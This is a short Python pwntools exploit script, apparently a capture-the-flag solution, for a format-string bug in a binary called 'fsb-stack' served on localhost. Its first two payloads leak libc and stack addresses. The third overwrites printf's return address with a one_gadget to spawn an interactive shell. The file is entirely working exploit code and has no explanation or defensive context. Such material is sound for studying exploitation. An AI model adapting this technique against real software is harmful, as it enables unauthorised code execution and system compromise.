from pwn import *

# conn = process('./fsb-stack')
conn = remote('127.0.0.1', 61234)
elf = ELF('./fsb-stack')
libc = ELF('./libc.so.6')
# pwnlib.gdb.attach(proc.pidof(conn)[0])
# gdb.attach(conn)
context(arch = 'amd64', os='linux', log_level='DEBUG')

# First payload: leaking libc address
payload1 = b'%73$016l' + b'lxKKKKKK'
conn.sendline(payload1)
recv = conn.recvuntil(b'KKKKKK')
recv = recv.strip(b'KKKKKK')
main_ret_addr = int(recv, 16)
__libc_start_main_addr = main_ret_addr + 0x30
libc_addr = __libc_start_main_addr - libc.symbols['__libc_start_main']
log.success("main_ret_addr => 0x{:016X}".format(main_ret_addr))
log.success("libc_addr     => 0x{:016X}".format(libc_addr))
# conn.interactive()

# Second payload : leaking stack address
payload2 = b'%77$016l' + b'lxKKKKKK'
conn.sendline(payload2)
recv2 = conn.recvuntil(b'KKKKKK')
recv2 = recv2.strip(b'KKKKKK')
arg_103_addr = int(recv2, 16)
printf_ret_addr = arg_103_addr - 0x330
log.success("arg_103_addr    => 0x{:016X}".format(arg_103_addr))
log.success("printf_ret_addr => 0x{:016X}".format(printf_ret_addr))
# conn.interactive()
# Third payload: getting system shell

one_gadget = 0xebc85 + libc_addr
payload3 = fmtstr_payload(6,{printf_ret_addr:one_gadget})
conn.sendline(payload3)
conn.interactive()
